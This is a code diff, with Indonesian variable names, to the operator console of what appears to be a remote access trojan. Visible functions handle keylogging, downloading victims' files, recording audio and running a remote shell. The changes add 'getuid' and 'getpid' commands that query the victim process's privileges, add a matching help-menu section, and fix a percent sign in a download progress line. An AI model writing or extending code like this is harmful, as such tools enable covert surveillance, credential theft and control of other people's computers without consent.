@@ -24,6 +24,14 @@ except KeyboardInterrupt:
     print('exiting listener')
     sys.exit()
 
+def recv_status_priv():
+    try:
+        _target.settimeout(5)
+        status = _target.recv(1024).decode()
+        return status
+    except:
+        print("Can't receive status")
+
 def recv_keylog():
     try:
         _target.settimeout(7)
@@ -236,7 +244,7 @@ def download_file(namafile):
                     break
                 file.write(data)
                 recv += len(data)
-                print(f'{recv}/{filesize} bytes ({recv/filesize*100:.2f})', end='\r')
+                print(f'{recv}/{filesize} bytes ({recv/filesize*100:.2f}%)', end='\r')
         print('\ndownloaded')
 
 def data_diterima():
@@ -346,7 +354,13 @@ def shellc():
 
                     -kill       >> kill program
                     ================================
+                      
+                        privileges:
+                    ================================
+                    -getuid     >> get user id
                     
+                    -getpid     >> get process id
+                    ================================
                     """)
             elif perintah == 'rec_audio':
                 p += 1
@@ -360,6 +374,10 @@ def shellc():
                 pass  
             elif perintah[:4] == 'kill':
                 pass  
+            elif perintah == 'getuid':
+                print(recv_status_priv())
+            elif perintah == 'getpid':
+                print(f"Current PID: {recv_status_priv()}")
             else:
                 hasil = data_diterima()
                 print(hasil)
